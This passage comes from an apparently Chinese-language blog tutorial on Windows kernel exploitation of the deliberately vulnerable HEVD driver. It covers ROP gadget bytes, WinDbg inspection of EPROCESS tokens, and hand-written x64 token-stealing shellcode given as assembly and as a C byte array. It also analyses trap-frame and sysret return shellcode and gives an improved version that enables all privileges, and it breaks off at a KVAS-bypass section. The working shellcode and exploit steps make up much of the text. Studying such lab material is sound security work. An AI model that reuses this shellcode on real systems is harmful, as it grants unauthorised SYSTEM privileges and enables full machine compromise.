class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure><p>如果想直接从二进制读取（这样更快）可以使用：<a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> 提供的思路去找</p><h1 id="shellcode编写"><a class="markdownIt-Anchor" href="#shellcode编写"></a> shellcode编写</h1><h2 id="a-手动进行token提权"><a class="markdownIt-Anchor" href="#a-手动进行token提权"></a> A. 手动进行Token提权</h2><p>第二章中使用的是他人提供的shellcode，这里尝试自己写汇编</p><p>注意，这里我们已经进入内核了，所以做的事情和user级别不一样</p><p>同<code>KRPOCESS</code>不同的是<code>EPROCESS</code>描述了程序运行的相关环境，例如：对应的<code>KPROCESS</code>指针、程序的权限等</p><p>在windbg中使用 ，可以列举所有的进程的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p><p>使用下面的命令来查看对应的EPROCESS结构体，这里查看<code>System</code>进程的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p><p><img src="https://img.joe1sn.top/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p><p>Token是一个<code>_EX_FAST_REF</code>类型的Union值</p><p><img src="https://img.joe1sn.top/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p><p><code>RefCnt</code>记录了Token引用的数目，是数据的低4位(64位中，32位是3位)</p><p>将当前进程的除<code>RefCnt</code>以外的其他bit位设置为和System的一致就行了，</p><p>这里 <code>Value</code>与掩码<code>-0xd</code>（RefCount）进行<code>&amp;</code>运算就能得到真实的Token值</p><p><img src="https://img.joe1sn.top/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p><p>现在将计算出的Token值复制给cmd.exe（<strong>这是一个新的Token</strong>）</p><p><img src="https://img.joe1sn.top/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p><p><img src="https://img.joe1sn.top/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p><p><img src="https://img.joe1sn.top/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p><p><img src="https://img.joe1sn.top/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p><h2 id="b-进行shellcode编写"><a class="markdownIt-Anchor" href="#b-进行shellcode编写"></a> B. 进行Shellcode编写</h2><p>在刚才的<code>EPROCESS</code>中，有一段记录的是程序的链表：<code>ActiveProcessLinks</code>，而且windows会生成一段独特的标识来标记每一个程序：<code>UniqueProcessId</code>，在这段 <strong>双向</strong> 链表上每段程序都可以被找到，因为可以向前和向后查找，<strong>一般System位于链表开头，所以沿着Flink查找</strong></p><p><img src="https://img.joe1sn.top/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p><p><img src="https://img.joe1sn.top/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p><p><img src="https://img.joe1sn.top/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p><ol><li><p>通过<code>EPROCESS</code>获得自身<code>ActiveProcessLinks</code>，同时向前/向后查找</p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">这篇文章</a>中通过模仿<code>PsGetCurrentProcess</code>，<code>gs:[188h]</code>指向的是一个<code>_KTHREAD </code>，函数的汇编会将这个地址<code>add addr,0xb8</code>，就得到了当前进程的<code>_EPROCESS</code>，这也是许多shellcode的技巧</p><p><img src="https://img.joe1sn.top/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p><p><img src="https://img.joe1sn.top/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p><p><code>ffff9984d3d97080 </code>就为一个 当前进程的<code>KiInitialThread </code></p><p><code>+0xB8</code>指向的是当前进程的<code>EPROCESS</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p><p><img src="https://img.joe1sn.top/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p></li><li><p>比较当前<code>ActiveProcessLinks</code>值<code>-8</code>的内存地址是否为<code>UniqueProcessId</code></p></li><li><p>否：更换当前结构体为下一个</p></li><li><p>是：从<code>ActiveProcessLinks-0x70</code>的位置得到<code>Token</code>地址</p></li><li><p>解析Token，赋值给<strong>当前进程</strong>（Windows会自动解析为exp的程序（从页表映射等来看确实应该如此））</p></li></ol><p>仔细逆向会发现</p><p><img src="https://img.joe1sn.top/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p><p>那么在没有任何栈变动的情况下<code>add rsp, 0x28</code>就能恢复栈，但是我们只有了ROP，ROP链中存在两个<code>ret</code>和一个<code>pop</code>，抬栈了0x18，所以在shellcode中只需要<code>add rsp, 0x10</code></p><p><img src="https://img.joe1sn.top/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p><p>同时HEVD的<code>NT_STATUS</code>使用<code>RAX</code>检测处理是否成功，所以要<code>xor rax,rax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax             ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p>使用nasm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure><p>编译出的文件位COFF格式，要提取出来，这里我用的是<code>CFF Explore</code>的快速反汇编定位到代码然后用<code>HxD</code>提取的</p><p><img src="https://img.joe1sn.top/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p><p><img src="https://img.joe1sn.top/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p><h2 id="c-分析上一篇的shellcode"><a class="markdownIt-Anchor" href="#c-分析上一篇的shellcode"></a> C. 分析上一篇的shellcode</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>写入一个二进制文档，用ida逆向</p><p><img src="https://img.joe1sn.top/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p><p>发现原理一致，最后对栈的恢复不同</p><p>已知<code>gs:[0x188]</code>指向一个<code>_KTHREAD</code>结构体</p><p><img src="https://img.joe1sn.top/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p><p>根据windbg的调试结果知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4];+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx;</span><br><span class="line">mov [rax+0x1e4], cx;更新KernelApcDisable为0</span><br><span class="line">mov rdx, [rax+0x90];+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">;_KTRAP_FRAME</span><br><span class="line">;---下面为_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168];[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178];[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180];[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158];[+0x158] Rbp</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p><p>可能还是有点😵，反汇编一下<code>TrapFrame</code>的RIP</p><p><img src="https://img.joe1sn.top/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p><p>相当于通过<code>TrapFrame</code>，替换了exp中的<code>DeviceIoControl</code>（模仿正常执行），并让他正常返回</p><p>接着重定位GS寄存器，使用sysret返回，为了对齐，有的汇编是这样的写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h2 id="d-开启token所有权限-优化shellcode"><a class="markdownIt-Anchor" href="#d-开启token所有权限-优化shellcode"></a> D. 开启Token所有权限 [优化shellcode]</h2><p>即使我们已经成功生成了令牌，但是功能依旧是不全的</p><p><img src="https://img.joe1sn.top/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p><p>被禁用的功能依旧有很多</p><h3 id="i-开启当前权限为启用"><a class="markdownIt-Anchor" href="#i-开启当前权限为启用"></a> I. 开启当前权限为启用</h3><p>重新打开一个普通用户的<code>cmd.exe</code></p><p><img src="https://img.joe1sn.top/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p><p>用A部分的方法找到该进程</p><p><img src="https://img.joe1sn.top/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p><p>查看token格式，对照一下SID。（注意低位要为0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Token数值，但是个位数为0&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p><p>将Enabled值设置为Present值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p><h3 id="ii-获得所有权限并启用"><a class="markdownIt-Anchor" href="#ii-获得所有权限并启用"></a> II. 获得所有权限并启用</h3><p>用A部分的方法得到System的Token</p><p><img src="https://img.joe1sn.top/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p><p>再得到SystemToken的Present值</p><p><img src="https://img.joe1sn.top/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p><p>设置当前Token的Present和Enabled为该值</p><p><img src="https://img.joe1sn.top/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p><h3 id="iii重新编写shellcode"><a class="markdownIt-Anchor" href="#iii重新编写shellcode"></a> III.重新编写shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p><h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1><h2 id="a-简介"><a class="markdownIt-Anchor" href="#a-简介"></a> A. 简介</h2><p>KVAS全称是Kernel Virtual Address Shadow，它的出现与MeltDown（CVE-2017-5754）和TotalMeltDown（CVE-2018-1038）有关。</p><p>我的描述不一定准确，大致上来说这两个漏洞利用了CPU的乱序执行技术，即CPU在执行时不一定会按照流程执行。当我们访问一个不能被用户模式访问的内存页时，CPU会执行该语句然后将其缓存到内存中，等到发现不能访问后返回错误，但是该数据依旧存在于缓存当中。利用这种思路就可以完全读取内核中的数据，实现权限提升等。</p><p>微软为了缓解该漏洞，从用户页表中隔离出内核页表，让用户态访问到的内核页表也是经过映射的，并且会将用户页表自动标记为NX，让我们的shellcode无法执行</p><h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. 